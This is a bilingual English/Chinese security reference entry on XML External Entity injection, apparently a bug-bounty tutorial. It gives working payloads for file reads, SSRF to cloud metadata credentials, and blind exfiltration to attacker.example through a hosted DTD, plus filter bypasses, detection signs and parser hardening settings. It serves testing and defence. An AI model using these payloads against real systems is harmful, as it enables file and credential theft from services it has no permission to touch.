---
id: xxe-xml-external-entity
title_en: XXE (XML External Entity Injection)
title_zh: XXE（XML 外部实体注入）
summary_en: XML lets a document define its own entities, and a naive parser will happily resolve one that points at a file or a URL. That single feature turns any XML endpoint into a file read, and often into SSRF as well.
summary_zh: XML 允许文档自定义实体，而天真的解析器会老老实实去解析一个指向文件或 URL 的实体。就这一个特性，能把任何 XML 接口变成文件读取，而且往往顺带变成 SSRF。
tags: [web, xxe, xml, ssrf, file-read, bugbounty]
tools: [Burp Suite, xxer, oxml_xxe, interactsh]
attck: [T1190, T1552.001]
platform: [web]
difficulty: intermediate
updated: 2026-10-08
---

<!-- lang:en -->
### Why the feature is the bug

XML supports Document Type Definitions, and a DTD can declare entities whose value comes from outside the document:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

If the parser resolves external entities, `&xxe;` is replaced with the contents of that file, wherever the value gets reflected. It is not a memory-safety bug or a logic error: it is the specification, implemented as written, against input the developer assumed was inert data.

Parsers differ, and so do the payloads:

| Parser behaviour | What works |
|---|---|
| External entities enabled, output reflected | Direct file read and SSRF |
| External entities enabled, no output | Out-of-band: the parser fetches a URL you control |
| Only external DTDs allowed | Host your own DTD and reference it |
| Entities disabled, but `file://` in other places | Check XInclude and any library that parses XML internally |
| JSON endpoint only | Look for an XML content type it still accepts |

### Step 1 — Find every XML parser

The obvious one is a SOAP or REST endpoint that takes `application/xml`. The interesting ones are everywhere else:

- **File uploads** that are secretly XML: `.docx`, `.xlsx`, `.pptx`, `.odt`, `.svg`, `.gpx`, `.kml`, `.plist`, `.rss`. An Office file is a ZIP full of XML, so a crafted `document.xml` inside an uploaded docx hits the same parser.
- **SAML** assertions and any federation flow.
- **SOAP** anywhere there is an integration nobody looks at.
- **Configuration import/export** features, which parse XML by definition.
- **PDF generation** from SVG or XSL-FO.
- **Android app manifests** and other parsers in mobile clients.

For Office and SVG uploads, the tooling matters: `oxml_xxe` builds a docx with the payload embedded, and for a quick blind check `xxer` runs a DTD server you can point the parser at.

### Step 2 — The four payload shapes

**File read, reflected:**

```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

On Windows, the equivalents are `file:///c:/windows/win.ini` and `file:///c:/boot.ini` (on old hosts). For PHP, wrap it in a base64 filter when the file breaks the XML:

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
```

**SSRF through the parser.** The same entity can point at an internal service, and the response comes back inside your XML:

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

This is the combination that pays: a blind-looking XML parser becomes a cloud credential theft. It also reaches internal HTTP services that are otherwise unreachable.

**Blind XXE with a parameter entity.** When the value never reflects, make the parser fetch something you can observe:

```xml
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd SYSTEM "http://attacker.example/evil.dtd">
  %dtd;
]>
<root/>
```

And on your server, `evil.dtd`:

```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.example/?x=%file;'>">
%all;
```

The parser requests your DTD, then requests your collector with the file contents in the URL — which is why the collector has to be a real listener, not just a log.

**Error-based.** When outbound traffic is blocked but errors are shown, force the parser to tell you the value by putting it in an invalid path.

### Step 3 — Bypasses worth knowing

- **Local DTD reuse.** Some parsers forbid external DTDs but allow a `SYSTEM` reference to a DTD already on the filesystem; redefining an entity inside it can leak data without any outbound request. This is the standard answer to "egress is blocked".
- **UTF-16 or UTF-7 encoding.** A filter looking for `<!ENTITY` in UTF-8 will not see it.
- **CDATA wrappers.** When the file content breaks XML syntax, wrap the entity and read it in two steps.
- **XInclude**, when the DTD path is dead:

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

### What it costs you, and what it costs the target

The impact ladder is worth stating in a report exactly this way: read a file (configuration, keys), read cloud credentials through SSRF, reach internal services, and in the worst case denial of service through entity expansion (billion laughs) or an entity pointing at a device file.

Do not test billion laughs on production. It is a real technique and a real outage.

### Detection

- XML bodies containing `<!DOCTYPE` or `<!ENTITY` where the application has no legitimate need for a DTD — almost no modern API does.
- Outbound HTTP requests from an application server to an unexpected host, especially small ones carrying base64 or a filename.
- Requests for `.dtd` files on your own infrastructure that you did not deploy.
- Office or SVG uploads whose internal XML contains a DOCTYPE.

### Mitigation

- **Disable DTD processing entirely** in every parser you use: `XMLConstants.FEATURE_SECURE_PROCESSING` plus `disallow-doctype-decl` in Java, `resolve_entities=False` in Python, `libxml_disable_entity_loader` (pre-PHP 8) or simply libxml's default in PHP 8.
- **Disable external entity and external DTD resolution** explicitly, even where the default is safe — defaults change between versions and libraries.
- **Prefer JSON** for new APIs; XML brings a large specification surface for no benefit if you control both ends.
- **Sandbox and restrict egress** from anything that parses uploaded documents, and never let a document parser reach the cloud metadata endpoint.
- **Validate uploads by content, not extension**, and re-serialise Office documents rather than passing them through.
- **Alert on DOCTYPE in request bodies**, which is a cheap and high-signal rule.

<!-- lang:zh -->
### 特性本身就是漏洞

XML 支持文档类型定义（DTD），而 DTD 可以声明值来自文档外部的实体：

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

如果解析器会解析外部实体，`&xxe;` 就会被替换成那个文件的内容 —— 在值被回显的任何地方。这不是内存安全漏洞，也不是逻辑错误：这就是规范，按规范实现，而输入被开发者当成了不会动的内容。

解析器不同，payload 也不同：

| 解析器行为 | 什么能用 |
|---|---|
| 允许外部实体，且回显 | 直接读文件与 SSRF |
| 允许外部实体，但不回显 | 带外：让解析器去请求你控制的 URL |
| 只允许外部 DTD | 自建一个 DTD 并引用它 |
| 禁了实体，但别处还用 `file://` | 试 XInclude，以及任何内部会解析 XML 的库 |
| 只收 JSON | 找找它是否仍接受某个 XML content type |

### 第一步 —— 找出所有 XML 解析点

最明显的是接收 `application/xml` 的 SOAP 或 REST 接口。有意思的都在别处：

- **本质是 XML 的文件上传**：`.docx`、`.xlsx`、`.pptx`、`.odt`、`.svg`、`.gpx`、`.kml`、`.plist`、`.rss`。Office 文件就是一堆 XML 打的包，所以在 docx 里构造一个 `document.xml` 打的是同一个解析器。
- **SAML** 断言和任何联邦登录流程。
- 任何没人看的集成里的 **SOAP**。
- **配置导入导出**功能，它们按定义就要解析 XML。
- 由 SVG 或 XSL-FO 生成 PDF 的功能。
- 移动端的 **Android 清单**等解析点。

对 Office 和 SVG 上传，工具很关键：`oxml_xxe` 能生成内嵌 payload 的 docx；快速做盲测时，`xxer` 能起一个供解析器访问的 DTD 服务。

### 第二步 —— 四种 payload 形态

**读文件且回显：**

```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

Windows 上对应 `file:///c:/windows/win.ini` 与（老主机上的）`file:///c:/boot.ini`。在 PHP 里，遇到文件内容会破坏 XML 结构的情况，就套 base64 过滤器：

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
```

**通过解析器做 SSRF。** 同一个实体可以指向内部服务，而响应会随你的 XML 一起回来：

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

这才是真正值钱的组合：一个看起来只是盲打的 XML 解析器，变成了云凭据窃取。它同样能打到原本不可达的内部 HTTP 服务。

**参数实体做盲 XXE。** 当值从不回显时，让解析器去请求你能观察到的东西：

```xml
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd SYSTEM "http://attacker.example/evil.dtd">
  %dtd;
]>
<root/>
```

你自己服务器上的 `evil.dtd`：

```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.example/?x=%file;'>">
%all;
```

解析器先来取你的 DTD，再带着文件内容请求你的收集端 —— 这也是为什么收集端必须是一个真正的监听器，而不只是个日志。

**报错回显。** 出网被封但错误会显示时，把值塞进一个非法路径，逼解析器告诉你。

### 第三步 —— 值得知道的绕过

- **复用本地 DTD。** 有些解析器禁止外部 DTD，却允许 `SYSTEM` 引用文件系统上已有的 DTD；在它内部重定义实体，就能在完全没有外连的情况下泄数据。这是"出网被封"的标准答案。
- **UTF-16 或 UTF-7 编码。** 一个在 UTF-8 里找 `<!ENTITY` 的过滤器根本看不到它。
- **CDATA 包裹。** 文件内容破坏 XML 语法时，把实体包起来分两步读。
- DTD 这条路走不通时，试 **XInclude**：

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

### 影响阶梯

报告里就该按这个顺序写：读到文件（配置、密钥）、通过 SSRF 拿到云凭据、触达内部服务，最坏情况是通过实体展开（billion laughs）或指向设备文件的实体造成拒绝服务。

别在生产上试 billion laughs。它是真实手法，也是真实事故。

### 检测

- 请求体里出现 `<!DOCTYPE` 或 `<!ENTITY`，而应用根本没有使用 DTD 的正当理由 —— 现代 API 几乎都没有。
- 应用服务器向意外主机发起的出站 HTTP 请求，尤其是体量很小、URL 里带着 base64 或文件名的那些。
- 自己基础设施上出现你没部署过的 `.dtd` 请求。
- 上传的 Office 或 SVG 文件，其内部 XML 里带 DOCTYPE。

### 缓解

- **在每一个解析器里彻底禁用 DTD 处理**：Java 用 `XMLConstants.FEATURE_SECURE_PROCESSING` 加 `disallow-doctype-decl`；Python 用 `resolve_entities=False`；PHP 8 之前用 `libxml_disable_entity_loader`，PHP 8 则用 libxml 的默认行为。
- **显式关闭外部实体与外部 DTD 解析**，即便当前默认是安全的 —— 默认值会随版本和库而变。
- **新接口优先用 JSON**；两端都自己控制时，XML 只带来巨大的规范攻击面而没有任何好处。
- **对解析上传文档的组件做沙箱与出网限制**，绝不能让文档解析器摸到云元数据端点。
- **按内容而不是扩展名校验上传**，并且对 Office 文档做重新序列化，而不是原样透传。
- **对请求体里的 DOCTYPE 告警**，这是一条成本极低、命中率极高的规则。
